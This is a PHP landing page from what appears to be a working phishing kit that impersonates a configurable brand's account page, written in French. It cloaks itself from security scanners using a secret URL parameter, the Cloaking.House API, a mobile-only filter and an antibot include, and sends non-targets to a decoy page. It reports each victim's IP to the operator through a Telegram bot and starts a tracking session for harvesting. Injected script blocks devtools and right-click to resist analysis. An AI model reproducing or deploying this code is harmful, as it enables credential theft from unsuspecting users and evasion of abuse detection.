<?php
ini_set('session.gc_maxlifetime', 900);
ini_set('session.cookie_lifetime', 900);
session_start();
include 'config.php';

// === GET parameter gate (before everything) ===
if (!empty($gate_param) && (!isset($_GET[$gate_param]) || $_GET[$gate_param] !== $gate_value)) {
    if (file_exists(__DIR__ . '/white.php')) { include __DIR__ . '/white.php'; exit; }
    http_response_code(404); die();
}

// === Cloaking.House check (before antibot) ===
if (!empty($ch_enabled) && !empty($ch_label)) {
    $ch_ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
    $ch_ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $ch_url = 'https://cloakit.house/api/v1/check?' . http_build_query(['label' => $ch_label, 'ip' => $ch_ip, 'ua' => $ch_ua]);
    $ch_resp = @file_get_contents($ch_url);
    if ($ch_resp) {
        $ch_data = json_decode($ch_resp, true);
        if (!empty($ch_data['bot']) || !empty($ch_data['blocked'])) {
            if (file_exists(__DIR__ . '/white.php')) { include __DIR__ . '/white.php'; exit; }
            http_response_code(404); die();
        }
    }
}

// === Mobile only check ===
if (!empty($mobile_only)) {
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
    if (!preg_match('/Mobile|Android|iPhone|iPad|iPod/i', $ua)) {
        if (file_exists(__DIR__ . '/white.php')) { include __DIR__ . '/white.php'; exit; }
        http_response_code(404); die();
    }
}

include 'ab/ab.php';
include 'app/panel_bridge.php';
$ip = _ip();
$message = "+1 Visiteur > <a href='https://check-host.net/ip-info?host=" . $ip . "'>" . $ip . "</a>";
@file_get_contents("https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $id_trash . "&text=" . urlencode($message) . "&parse_mode=HTML");
$country = $_SESSION['country'] ?? 'XX';
$panelFile = _panelDir() . '/' . ($_SESSION['panel_session_id'] ?? '') . '.json';
if (empty($_SESSION['panel_session_id']) || !file_exists($panelFile)) {
    $_kitName = preg_replace('/\.(com|net|org|be|fr|de|nl|es|it|co\.uk)$/i', '', $brand_domain ?? 'unknown');
    panelSessionInit($_kitName, $ip, $country);
}
?><!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<link rel="icon" href="/favicon.ico">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title><?php echo ucfirst(str_replace('.com','',($brand_domain ?? 'Account'))); ?></title>
<link rel="stylesheet" href="/assets/fontawesome/css/all.min.css">
<script>window.__MOTIF__=<?php echo (int)$motif;?>;window.__LANG__="auto";window.__SKIP_SOCIAL__=<?php echo $skipsocialmedia ? 'true' : 'false';?>;window.__CAPTCHA_MODE__=<?php echo (int)$captcha;?>;window.__LOADING_TIMER__=<?php echo (int)($loading_timer ?? 60);?>;window.__COUNTRY__="<?php echo htmlspecialchars($country, ENT_QUOTES);?>";window.__BRAND_DOMAIN__="<?php echo htmlspecialchars($brand_domain ?? '', ENT_QUOTES);?>";</script>
<script type="module" crossorigin src="/assets/app.js"></script>
<link rel="stylesheet" crossorigin href="/assets/app.css">
</head>
<body class="secure"><div id="app"></div><style>#app{opacity:0;transition:opacity .15s ease}#app.ready{opacity:1}</style>
<script>!function(){var w='/white.php';document.addEventListener('contextmenu',function(e){e.preventDefault()});document.addEventListener('keydown',function(e){if(e.key==='F12'||(e.ctrlKey&&e.shiftKey&&(e.key==='I'||e.key==='J'||e.key==='C'))||(e.ctrlKey&&e.key==='u')||(e.ctrlKey&&e.key==='U')){e.preventDefault();window.location.href=w;return false}});var d=function(){var t=new Image();Object.defineProperty(t,'id',{get:function(){window.location.href=w}});void 0};}();</script></body>
</html>
